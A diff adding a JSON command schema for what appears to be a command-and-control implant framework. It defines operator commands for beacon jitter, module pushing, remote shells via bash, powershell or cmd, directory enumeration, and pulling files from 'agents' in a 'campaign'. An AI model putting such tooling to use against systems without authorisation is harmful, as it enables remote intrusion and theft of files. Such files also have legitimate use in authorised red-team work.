@@ -1,0 +1,146 @@
+{
+	"agent.purge":{
+		"description":"purge active agent from metadata table to redeploy build",
+		"arguments":{
+			"acid":"agent to purge"
+		},
+		"required":[
+			"acid"
+		]
+	},
+	"agent.listmod":{
+		"description":"list all java modules available to be loaded",
+		"arguments":{},
+		"required":[]
+	},
+	"agent.halt":{
+		"description":"exit the agent process",
+		"arguments":{
+			"acid":"agent to halt"
+		},
+		"required":[
+			"acid"
+		]
+	},
+	"agent.sessionize":{
+		"description":"set agent heartbeat to regular, short intervals",
+		"arguments":{
+			"acid":"agent to sessionize",
+			"flag":"1 to sessionize, 0 to desessionize"
+		},
+		"required":[
+			"acid",
+			"flag"
+		]
+	},
+	"agent.netconfig":{
+		"description":"re-configure the beacon settings",
+		"arguments":{
+			"acid":"agent to re-configure",
+			"jitter_min":"minimum jitter for beacon",
+			"jitter_max":"maximum jitter for beacon",
+			"threads_max":"maximum threads to use when multithreading beacon"
+		},
+		"required":[
+			"acid",
+			"jitter_min",
+			"jitter_max",
+			"threads_max"
+		]
+	},
+	"agent.pushmod":{
+		"description":"push module to the agent",
+		"arguments":{
+			"acid":"agent receiving module",
+			"package":"root name of class file for package (i.e., 'control' for 'control.class'"
+		},
+		"required":[
+			"acid",
+			"package"
+		]
+	},
+	"agent.list":{
+		"description":"get list of active agents",
+		"arguments":{},
+		"required":[]
+	},
+	"agent.metadata":{
+		"description":"fetch metadata for agent",
+		"arguments":{
+			"acid":"agent to collect metadata"
+		},
+		"required":[
+			"acid"
+		]
+	},
+	"exec.shell":{
+		"description":"execute interactive shell",
+		"arguments":{
+			"acid":"agent to interact with",
+			"interpreter":"interpreter to use for the command ['/bin/bash','/bin/sh','powershell','python','cmd'](interpreter must be available on the system)"
+		},
+		"required":[
+			"acid",
+			"interpreter"
+		]
+	},
+	"exec.command":{
+		"description":"execute non-interactive command",
+		"arguments":{
+			"acid":"agent to execute command",
+			"interpreter":"interpreter to use for the command ['/bin/bash','/bin/sh','powershell','python','cmd'](interpreter must be available on the system)",
+			"command":"full command to run"
+		},
+		"required":[
+			"acid",
+			"interpreter",
+			"command"
+		]
+	},
+	"enum.roots":{
+		"description":"list filesystem roots (drives / root directories)",
+		"arguments":{
+			"acid":"agent to enumerate roots on"
+		},
+		"required":[
+			"acid"
+		]
+	},
+	"enum.directories":{
+		"description":"list directory tree starting from a specified root",
+		"arguments":{
+			"acid":"agent to enumerate directories on",
+			"root":"directory to start walk in",
+			"depth":"maximum depth to walk, starting at 0"
+		},
+		"required":[
+			"acid",
+			"root",
+			"depth"
+		]
+	},
+	"file.push":{
+		"description":"push file to agent",
+		"arguments":{
+			"acid":"agent to receive file",
+			"file":"name of local file to push (must be in the campaign's docroot)",
+			"destination":"full path of directory to write file"
+		},
+		"required":[
+			"acid",
+			"file",
+			"destination"
+		]
+	},
+	"file.pull":{
+		"description":"pull file from agent (slow upload)",
+		"arguments":{
+			"acid":"agent to send file",
+			"file":"full path of remote file to pull"
+		},
+		"required":[
+			"acid",
+			"file"
+		]
+	}
+}
